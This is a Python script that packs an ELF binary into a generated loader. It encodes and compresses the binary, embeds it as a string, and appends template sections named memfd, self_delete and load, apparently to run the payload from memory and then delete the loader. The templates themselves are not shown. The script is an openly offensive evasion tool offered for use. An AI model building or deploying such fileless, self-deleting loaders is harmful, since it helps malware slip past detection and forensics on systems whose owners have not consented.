#!/usr/bin/python3
import argparse
import base64
import os
import sys 
import zlib

from minitemplate.template import *


class CodeGenerator:
    def __init__(self) -> None:
        #self.compression_level = 9
        self.imports = ['import argparse', 'import base64', 'import ctypes', 'import os', 'import sys', 'import subprocess', 'import zlib']
        self.payload = ''


    def prepare_elf(self, elf):
        with open(elf, 'rb') as fp:
            read_in_elf = fp.read()
        encoded = base64.standard_b64encode(read_in_elf)
        compressed_elf = zlib.compress(encoded)
        final_encoded = base64.standard_b64encode(compressed_elf)
        return final_encoded 


    def prepare_imports(self, output_file):
        with open(output_file, 'w') as fp:
            for i in self.imports:
                fp.write(i)
                fp.write('\n')
            fp.write('\n')
        return True
    

    def write_payload(self, payload, output_file):
        generate = self.prepare_elf(payload)
        with open(output_file, 'a+') as fp:
            fp.write("p = '")
            fp.write(generate.decode('utf-8'))
            fp.write("'")
            fp.write('\n')


    def write_template(self, output_file):
        with open(output_file, 'a') as fp:
            fp.write(command_existence)
            fp.write('\n')
            fp.write(memfd)
            fp.write('\n')
            fp.write(self_delete)
            fp.write('\n')
            fp.write(load)
            fp.write('\n')
            fp.write(main)
            fp.write('\n')
            

if __name__ == '__main__':

    parser = argparse.ArgumentParser()

    parser.add_argument(
        "-b",
        "--binary",
        action="store",
        dest="binary",
        help="The binary to load into memory, file should be an elf.",
    )
    parser.add_argument(
        "-o",
        "--output",
        action="store",
        dest="output",
        help="The final loaders filename to output.",
    )

    args = parser.parse_args()

    if not args.output or not args.binary:
        print(f"[!] python3 {sys.argv[0]} --help")
        sys.exit(1)

    generate = CodeGenerator()

    generate.prepare_imports(args.output)
    
    generate.write_payload(args.binary, args.output)

    generate.write_template(args.output)
